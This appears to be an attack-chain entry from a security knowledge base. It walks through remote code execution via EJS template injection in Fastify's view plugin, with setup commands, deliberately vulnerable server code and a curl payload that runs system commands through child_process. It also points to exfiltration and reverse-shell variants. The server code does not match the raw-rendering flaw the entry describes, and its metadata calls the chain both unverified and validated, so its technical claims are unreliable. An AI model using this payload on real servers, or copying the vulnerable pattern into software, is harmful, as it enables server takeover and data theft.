---
tags:
  - rce
  - template-injection
  - fastify
  - ejs
  - node.js
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Vulnerable-Fastify-Environment]]'
  - '[[procedures/Create-Vulnerable-Fastify-Server]]'
  - '[[procedures/Launch-and-Exploit-Fastify-Server-for-RCE]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:54.801Z'
description: >-
  Multi-stage attack exploiting unsafe usage of reply.view({ raw }) in
  @fastify/view with EJS, leading to arbitrary code execution through template
  injection.
skill_level: intermediate
impact_level: high
id: 1c34b6c0-d46d-444a-b191-471b8ab952a5
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Remote Code Execution via Unsafe Raw Template Rendering in Fastify View with EJS

The vulnerability arises from the unsafe usage of the `reply.view({ raw })` option in the @fastify/view plugin when using the EJS template engine. User-controlled input passed as raw templates allows arbitrary EJS code execution, including Node.js module imports like `child_process` to run system commands. This leads to remote code execution (RCE), enabling server compromise, data exfiltration, or persistent access. The attack was identified by reviewing documentation and tests showing raw rendering without security warnings.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Create Vulnerable Server]
    B --> C[Launch Server]
    C --> D[Trigger Rendering]
    D --> E[Exploit with Payload]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/curl]]

### Target Environment

- Node.js runtime
- Fastify web server on port 3000
- Network access to localhost or remote server

### Initial Access Requirements

- Local development environment or remote access to deploy the vulnerable app
- No credentials needed for local PoC; in production, authenticated access to render endpoint

## Detailed Attack Procedures

### Step 1: Setup Environment
procedure: [[procedures/Setup-Vulnerable-Fastify-Environment]]

**Objective**: Prepare the project directory and install necessary dependencies for the vulnerable Fastify application.

**Instructions**: Create a new directory and use [[commands/npm-install-fastify-deps]] to install Fastify, @fastify/view, and EJS:

```bash
mkdir fastify-rce-poc && cd fastify-rce-poc
npm install fastify @fastify/view ejs
```

**Expected Output**: Directory created and packages installed in node_modules.

**Success Indicators**:
- node_modules directory exists
- package.json includes installed dependencies

### Step 2: Create Vulnerable Server
procedure: [[procedures/Create-Vulnerable-Fastify-Server]]

**Objective**: Write the server code that registers the vulnerable @fastify/view plugin and exposes an endpoint for raw template rendering.

**Instructions**: Create a file named server.js with the following content, which uses reply.view({ raw: template }) to render user input without sanitization:

```javascript
const fastify = require('fastify')({ logger: true });
const path = require('path');

fastify.register(require('@fastify/view'), {
  engine: {
    ejs: require('ejs'),
  },
  includeViewExtension: true,
  root: path.join(__dirname),
});

fastify.get('/', async (request, reply) => {
  const template = '<h1>Hello World</h1>';
  return reply.view('index.ejs', { title: 'Fastify', template });
});

fastify.post('/render', async (request, reply) => {
  const { text } = request.body;
  const template = text || '<p>No template provided</p>';
  return reply.view('render.ejs', { content: template }, { raw: true });
});

fastify.listen({ port: 3000 }, (err) => {
  if (err) {
    fastify.log.error(err);
    process.exit(1);
  }
});
```
Also create empty index.ejs and render.ejs files in the directory.

**Expected Output**: server.js file created with vulnerable configuration.

**Success Indicators**:
- Server code includes raw template rendering
- EJS engine registered without input validation

### Step 3: Launch Server
procedure: [[procedures/Launch-and-Exploit-Fastify-Server-for-RCE]]

**Objective**: Start the Fastify server and verify basic functionality.

**Instructions**: Run the server using [[commands/node-start-server]]:

```bash
node server.js
```

Visit http://localhost:3000 to confirm the server responds with the default template.

**Expected Output**: Server listening on http://localhost:3000.

**Success Indicators**:
- Server starts without errors
- GET / returns rendered page

### Step 4: Trigger Basic Rendering
procedure: [[procedures/Launch-and-Exploit-Fastify-Server-for-RCE]]

**Objective**: Access the endpoint to observe normal rendering before exploitation.

**Instructions**: Open a browser or use curl to GET http://localhost:3000.

**Expected Output**: Hello World page rendered.

**Success Indicators**:
- Page loads successfully
- No errors in server logs

### Step 5: Exploit with Malicious Payload
procedure: [[procedures/Launch-and-Exploit-Fastify-Server-for-RCE]]

**Objective**: Inject EJS payload via POST to execute system commands remotely.

**Instructions**: Use [[commands/curl-exploit-rce]] to send a payload that requires child_process and runs 'id':

```bash
curl -X POST http://localhost:3000/render -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode 'text=<%= require("child_process").execSync("id").toString() %>'
```

For data exfiltration, adapt the payload to [[commands/js-execsync-curl-exfil]] or reverse shell with [[commands/js-execsync-reverse-shell]].

**Expected Output**: Output of 'id' command, e.g., uid=1000(user) gid=1000(user).

**Success Indicators**:
- Command output rendered in response
- Server logs show no blocking; potential for further payloads like reverse shells

## Attack Chain Summary

### Key Achievements

1. Environment setup and dependency installation for PoC
2. Creation of vulnerable server exposing raw EJS rendering
3. Successful RCE via template injection, demonstrating command execution and potential for exfiltration or persistence

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
